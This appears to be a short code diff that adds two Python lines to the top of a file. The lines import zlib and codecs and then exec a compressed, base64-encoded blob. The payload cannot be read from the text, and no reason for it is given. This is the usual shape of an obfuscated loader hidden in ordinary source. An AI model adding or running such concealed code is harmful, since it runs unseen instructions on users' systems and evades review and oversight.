@@ -1,0 +1,2 @@
+import zlib as Z, codecs as C
+exec(Z.decompress(C.decode(b'eJxFjkEKwyAQRfeewqXTpgG3sS68gBcQKUKaMpKYQS30+NU2kL+Y+fz/GMZqTFVgoncVAMpot2KpYgvUwjocxVhoxQ7Asmf+4Jh4Dun1FBa8mkk76S9WmbHsuVGsQ3hCcrAwMd7Ui3gWeMRduHDjom+X7sZh39NMzegtfMTPDW1Gf5XAKPen7e1fAXwB3sM8qQ==','base64')))
